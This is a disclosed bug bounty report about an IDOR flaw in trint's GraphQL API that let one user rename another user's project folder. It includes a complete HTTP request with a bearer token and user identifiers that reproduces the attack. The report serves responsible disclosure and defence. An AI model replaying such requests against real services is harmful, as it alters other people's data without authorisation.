# IDOR to update folder name of other user

## Report Details
- **Report ID**: 587687
- **URL**: https://hackerone.com/reports/587687
- **State**: Closed
- **Severity**: low
- **Submitted**: 2019-05-22T08:16:42.265Z
- **Disclosed**: 2019-07-03T11:30:45.848Z

## Reporter
- **Username**: toannc123
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: trint

## Vulnerability Information
###Summary
There is an IDOR to update folder name of other user

###Steps To Reproduce:

- user A login to the application and see the folder name

{F494331}


- user B login to the application and call the API with the **projectId** of user A

```
POST / HTTP/1.1
Host: graphql2.trint.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://app.trint.com/trints
content-type: application/json
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJodHRwczovL2FwcC50cmludC5jb20vaXNOZXdVc2VyIjp0cnVlLCJodHRwczovL2FwcC50cmludC5jb20vdXNlcklkIjoiNWNlNTAyYTIxZTFjYWY3NTBkNmM3ZjU5IiwiaXNzIjoiaHR0cHM6Ly90cmludC5hdXRoMC5jb20vIiwic3ViIjoiZmFjZWJvb2t8NTM5NjM3MDE2NTY4MjUxIiwiYXVkIjoiaWNoNGh5VllQS0tnZUVvVGg2ZldQWGM2ZnJ2ZVRjVHEiLCJpYXQiOjE1NTg1MTIyOTYsImV4cCI6MTU2MDg3Mjg4MH0.umWI5RJnC3bO1NbP5TFI0A37H182U7J0WC3d_5W0xLc
X-Trint-Request-Id: 53c6c888-89a3-402b-b6f5-2dedc3f69aa8
X-Trint-Super-Properties: {"distinct_id":"5ce502a21e1caf750d6c7f59","$device_id":"16ade919a91481-044fc792d93be1-4c312272-1fa400-16ade919a9274","$initial_referrer":"$direct","$initial_referring_domain":"$direct","returningUser":false,"$user_id":"5ce502a21e1caf750d6c7f59"}
Origin: https://app.trint.com
Content-Length: 490
Connection: close

{"operationName":"updateProject","variables":{"userId":"5ce502a21e1caf750d6c7f59","projectName":"abctesthorizontal","projectId":"i2lu5qZVTwWnQQhPp_g8Ig"},"query":"mutation updateProject($userId: String!, $projectName: String!, $projectId: String!) {\n  updateProject(userId: $userId, projectName: $projectName, projectId: $projectId) {\n    ...RenameProjectFragment\n    __typename\n  }\n}\n\nfragment RenameProjectFragment on Project {\n  _id\n  projectName\n  updated\n  __typename\n}\n"}
```

{F494332}


- After that, the folder name of user A is changed

{F494333}

## Impact

An attacker could update folder name of other user.

## Attachments
- Capture1.PNG
- Capture2.PNG
- Capture3.PNG
